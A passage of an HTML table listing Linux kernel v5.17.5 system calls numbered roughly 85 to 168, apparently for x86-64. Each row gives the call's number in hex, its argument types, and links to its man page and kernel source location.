href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L1396">fs&#x2F;open.c:1396</a></td></tr><tr><td>86</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/link.2.html">sys_link</a></td><td>0x56</td><td>const char __user *oldname</td><td>const char __user *newname</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4632">fs&#x2F;namei.c:4632</a></td></tr><tr><td>87</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unlink.2.html">sys_unlink</a></td><td>0x57</td><td>const char __user *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4366">fs&#x2F;namei.c:4366</a></td></tr><tr><td>88</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/symlink.2.html">sys_symlink</a></td><td>0x58</td><td>const char __user *old</td><td>const char __user *new</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4450">fs&#x2F;namei.c:4450</a></td></tr><tr><td>89</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readlink.2.html">sys_readlink</a></td><td>0x59</td><td>const char __user *path</td><td>char __user *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L498">fs&#x2F;stat.c:498</a></td></tr><tr><td>90</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chmod.2.html">sys_chmod</a></td><td>0x5a</td><td>const char __user *filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L661">fs&#x2F;open.c:661</a></td></tr><tr><td>91</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchmod.2.html">sys_fchmod</a></td><td>0x5b</td><td>unsigned int fd</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L625">fs&#x2F;open.c:625</a></td></tr><tr><td>92</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chown.2.html">sys_chown</a></td><td>0x5c</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L785">fs&#x2F;open.c:785</a></td></tr><tr><td>93</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchown.2.html">sys_fchown</a></td><td>0x5d</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L821">fs&#x2F;open.c:821</a></td></tr><tr><td>94</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lchown.2.html">sys_lchown</a></td><td>0x5e</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L790">fs&#x2F;open.c:790</a></td></tr><tr><td>95</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/umask.2.html">sys_umask</a></td><td>0x5f</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1864">kernel&#x2F;sys.c:1864</a></td></tr><tr><td>96</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/gettimeofday.2.html">sys_gettimeofday</a></td><td>0x60</td><td>struct __kernel_old_timeval __user *tv</td><td>struct timezone __user *tz</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/time.c#L140">kernel&#x2F;time&#x2F;time.c:140</a></td></tr><tr><td>97</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrlimit.2.html">sys_getrlimit</a></td><td>0x61</td><td>unsigned int resource</td><td>struct rlimit __user *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1498">kernel&#x2F;sys.c:1498</a></td></tr><tr><td>98</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrusage.2.html">sys_getrusage</a></td><td>0x62</td><td>int who</td><td>struct rusage __user *ru</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1838">kernel&#x2F;sys.c:1838</a></td></tr><tr><td>99</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysinfo.2.html">sys_sysinfo</a></td><td>0x63</td><td>struct sysinfo __user *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L2716">kernel&#x2F;sys.c:2716</a></td></tr><tr><td>100</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/times.2.html">sys_times</a></td><td>0x64</td><td>struct tms __user *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1005">kernel&#x2F;sys.c:1005</a></td></tr><tr><td>101</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ptrace.2.html">sys_ptrace</a></td><td>0x65</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/ptrace.c#L1269">kernel&#x2F;ptrace.c:1269</a></td></tr><tr><td>102</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getuid.2.html">sys_getuid</a></td><td>0x66</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>103</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/syslog.2.html">sys_syslog</a></td><td>0x67</td><td>int type</td><td>char __user *buf</td><td>int len</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/printk/printk.c#L1769">kernel&#x2F;printk&#x2F;printk.c:1769</a></td></tr><tr><td>104</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgid.2.html">sys_getgid</a></td><td>0x68</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>105</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setuid.2.html">sys_setuid</a></td><td>0x69</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L650">kernel&#x2F;sys.c:650</a></td></tr><tr><td>106</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgid.2.html">sys_setgid</a></td><td>0x6a</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L467">kernel&#x2F;sys.c:467</a></td></tr><tr><td>107</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/geteuid.2.html">sys_geteuid</a></td><td>0x6b</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>108</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getegid.2.html">sys_getegid</a></td><td>0x6c</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>109</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setpgid.2.html">sys_setpgid</a></td><td>0x6d</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1055">kernel&#x2F;sys.c:1055</a></td></tr><tr><td>110</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getppid.2.html">sys_getppid</a></td><td>0x6e</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>111</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpgrp.2.html">sys_getpgrp</a></td><td>0x6f</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>112</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setsid.2.html">sys_setsid</a></td><td>0x70</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>113</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setreuid.2.html">sys_setreuid</a></td><td>0x71</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L587">kernel&#x2F;sys.c:587</a></td></tr><tr><td>114</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setregid.2.html">sys_setregid</a></td><td>0x72</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L421">kernel&#x2F;sys.c:421</a></td></tr><tr><td>115</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgroups.2.html">sys_getgroups</a></td><td>0x73</td><td>int gidsetsize</td><td>gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/groups.c#L161">kernel&#x2F;groups.c:161</a></td></tr><tr><td>116</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgroups.2.html">sys_setgroups</a></td><td>0x74</td><td>int gidsetsize</td><td>gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/groups.c#L198">kernel&#x2F;groups.c:198</a></td></tr><tr><td>117</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresuid.2.html">sys_setresuid</a></td><td>0x75</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L730">kernel&#x2F;sys.c:730</a></td></tr><tr><td>118</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresuid.2.html">sys_getresuid</a></td><td>0x76</td><td>uid_t __user *ruid</td><td>uid_t __user *euid</td><td>uid_t __user *suid</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L735">kernel&#x2F;sys.c:735</a></td></tr><tr><td>119</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresgid.2.html">sys_setresgid</a></td><td>0x77</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L813">kernel&#x2F;sys.c:813</a></td></tr><tr><td>120</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresgid.2.html">sys_getresgid</a></td><td>0x78</td><td>gid_t __user *rgid</td><td>gid_t __user *egid</td><td>gid_t __user *sgid</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L818">kernel&#x2F;sys.c:818</a></td></tr><tr><td>121</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpgid.2.html">sys_getpgid</a></td><td>0x79</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1154">kernel&#x2F;sys.c:1154</a></td></tr><tr><td>122</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsuid.2.html">sys_setfsuid</a></td><td>0x7a</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L881">kernel&#x2F;sys.c:881</a></td></tr><tr><td>123</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsgid.2.html">sys_setfsgid</a></td><td>0x7b</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L925">kernel&#x2F;sys.c:925</a></td></tr><tr><td>124</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getsid.2.html">sys_getsid</a></td><td>0x7c</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1168">kernel&#x2F;sys.c:1168</a></td></tr><tr><td>125</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/capget.2.html">sys_capget</a></td><td>0x7d</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/capability.c#L148">kernel&#x2F;capability.c:148</a></td></tr><tr><td>126</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/capset.2.html">sys_capset</a></td><td>0x7e</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/capability.c#L222">kernel&#x2F;capability.c:222</a></td></tr><tr><td>127</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigpending.2.html">sys_rt_sigpending</a></td><td>0x7f</td><td>sigset_t __user *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3213">kernel&#x2F;signal.c:3213</a></td></tr><tr><td>128</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigtimedwait.2.html">sys_rt_sigtimedwait</a></td><td>0x80</td><td>const sigset_t __user *uthese</td><td>siginfo_t __user *uinfo</td><td>const struct __kernel_timespec __user *uts</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3627">kernel&#x2F;signal.c:3627</a></td></tr><tr><td>129</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigqueueinfo.2.html">sys_rt_sigqueueinfo</a></td><td>0x81</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t __user *uinfo</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3996">kernel&#x2F;signal.c:3996</a></td></tr><tr><td>130</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigsuspend.2.html">sys_rt_sigsuspend</a></td><td>0x82</td><td>sigset_t __user *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L4633">kernel&#x2F;signal.c:4633</a></td></tr><tr><td>131</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaltstack.2.html">sys_sigaltstack</a></td><td>0x83</td><td>const struct sigaltstack __user *uss</td><td>struct sigaltstack __user *uoss</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L4227">kernel&#x2F;signal.c:4227</a></td></tr><tr><td>132</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utime.2.html">sys_utime</a></td><td>0x84</td><td>char __user *filename</td><td>struct utimbuf __user *times</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/utimes.c#L214">fs&#x2F;utimes.c:214</a></td></tr><tr><td>133</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mknod.2.html">sys_mknod</a></td><td>0x85</td><td>const char __user *filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L3996">fs&#x2F;namei.c:3996</a></td></tr><tr><td>134</td><td>not implemented</td><td>0x86</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>135</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/personality.2.html">sys_personality</a></td><td>0x87</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/exec_domain.c#L38">kernel&#x2F;exec_domain.c:38</a></td></tr><tr><td>136</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ustat.2.html">sys_ustat</a></td><td>0x88</td><td>unsigned dev</td><td>struct ustat __user *ubuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/statfs.c#L248">fs&#x2F;statfs.c:248</a></td></tr><tr><td>137</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/statfs.2.html">sys_statfs</a></td><td>0x89</td><td>const char __user * path</td><td>struct statfs __user *buf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/statfs.c#L192">fs&#x2F;statfs.c:192</a></td></tr><tr><td>138</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatfs.2.html">sys_fstatfs</a></td><td>0x8a</td><td>unsigned int fd</td><td>struct statfs __user *buf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/statfs.c#L213">fs&#x2F;statfs.c:213</a></td></tr><tr><td>139</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysfs.2.html">sys_sysfs</a></td><td>0x8b</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/filesystems.c#L191">fs&#x2F;filesystems.c:191</a></td></tr><tr><td>140</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpriority.2.html">sys_getpriority</a></td><td>0x8c</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L281">kernel&#x2F;sys.c:281</a></td></tr><tr><td>141</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setpriority.2.html">sys_setpriority</a></td><td>0x8d</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L211">kernel&#x2F;sys.c:211</a></td></tr><tr><td>142</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setparam.2.html">sys_sched_setparam</a></td><td>0x8e</td><td>pid_t pid</td><td>struct sched_param __user *param</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L7872">kernel&#x2F;sched&#x2F;core.c:7872</a></td></tr><tr><td>143</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getparam.2.html">sys_sched_getparam</a></td><td>0x8f</td><td>pid_t pid</td><td>struct sched_param __user *param</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L7955">kernel&#x2F;sched&#x2F;core.c:7955</a></td></tr><tr><td>144</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setscheduler.2.html">sys_sched_setscheduler</a></td><td>0x90</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param __user *param</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L7857">kernel&#x2F;sched&#x2F;core.c:7857</a></td></tr><tr><td>145</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getscheduler.2.html">sys_sched_getscheduler</a></td><td>0x91</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L7926">kernel&#x2F;sched&#x2F;core.c:7926</a></td></tr><tr><td>146</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_get_priority_max.2.html">sys_sched_get_priority_max</a></td><td>0x92</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L8754">kernel&#x2F;sched&#x2F;core.c:8754</a></td></tr><tr><td>147</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_get_priority_min.2.html">sys_sched_get_priority_min</a></td><td>0x93</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L8781">kernel&#x2F;sched&#x2F;core.c:8781</a></td></tr><tr><td>148</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_rr_get_interval.2.html">sys_sched_rr_get_interval</a></td><td>0x94</td><td>pid_t pid</td><td>struct __kernel_timespec __user *interval</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L8846">kernel&#x2F;sched&#x2F;core.c:8846</a></td></tr><tr><td>149</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlock.2.html">sys_mlock</a></td><td>0x95</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mlock.c#L614">mm&#x2F;mlock.c:614</a></td></tr><tr><td>150</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munlock.2.html">sys_munlock</a></td><td>0x96</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mlock.c#L632">mm&#x2F;mlock.c:632</a></td></tr><tr><td>151</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlockall.2.html">sys_mlockall</a></td><td>0x97</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mlock.c#L697">mm&#x2F;mlock.c:697</a></td></tr><tr><td>152</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munlockall.2.html">sys_munlockall</a></td><td>0x98</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>153</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vhangup.2.html">sys_vhangup</a></td><td>0x99</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>155</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pivot_root.2.html">sys_pivot_root</a></td><td>0x9b</td><td>const char __user *new_root</td><td>const char __user *put_old</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L3868">fs&#x2F;namespace.c:3868</a></td></tr><tr><td>156</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ni_syscall.2.html">sys_ni_syscall</a></td><td>0x9c</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>157</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/prctl.2.html">sys_prctl</a></td><td>0x9d</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L2351">kernel&#x2F;sys.c:2351</a></td></tr><tr><td>159</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/adjtimex.2.html">sys_adjtimex</a></td><td>0x9f</td><td>struct __kernel_timex __user *txc_p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/time.c#L269">kernel&#x2F;time&#x2F;time.c:269</a></td></tr><tr><td>160</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setrlimit.2.html">sys_setrlimit</a></td><td>0xa0</td><td>unsigned int resource</td><td>struct rlimit __user *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1711">kernel&#x2F;sys.c:1711</a></td></tr><tr><td>161</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chroot.2.html">sys_chroot</a></td><td>0xa1</td><td>const char __user *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L556">fs&#x2F;open.c:556</a></td></tr><tr><td>162</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sync.2.html">sys_sync</a></td><td>0xa2</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/sync.c#L149">fs&#x2F;sync.c:149</a></td></tr><tr><td>163</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/acct.2.html">sys_acct</a></td><td>0xa3</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/acct.c#L292">kernel&#x2F;acct.c:292</a></td></tr><tr><td>164</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/settimeofday.2.html">sys_settimeofday</a></td><td>0xa4</td><td>struct __kernel_old_timeval __user *tv</td><td>struct timezone __user *tz</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/time.c#L199">kernel&#x2F;time&#x2F;time.c:199</a></td></tr><tr><td>165</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mount.2.html">sys_mount</a></td><td>0xa5</td><td>char __user *dev_name</td><td>char __user *dir_name</td><td>char __user *type</td><td>unsigned long flags</td><td>void __user *data</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L3568">fs&#x2F;namespace.c:3568</a></td></tr><tr><td>166</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/umount.2.html">sys_umount</a></td><td>0xa6</td><td>char __user *name</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L1828">fs&#x2F;namespace.c:1828</a></td></tr><tr><td>167</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/swapon.2.html">sys_swapon</a></td><td>0xa7</td><td>const char __user *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/swapfile.c#L2976">mm&#x2F;swapfile.c:2976</a></td></tr><tr><td>168</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/swapoff.2.html">sys_swapoff</a></td><td>0xa8</td><td>const char __user *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a 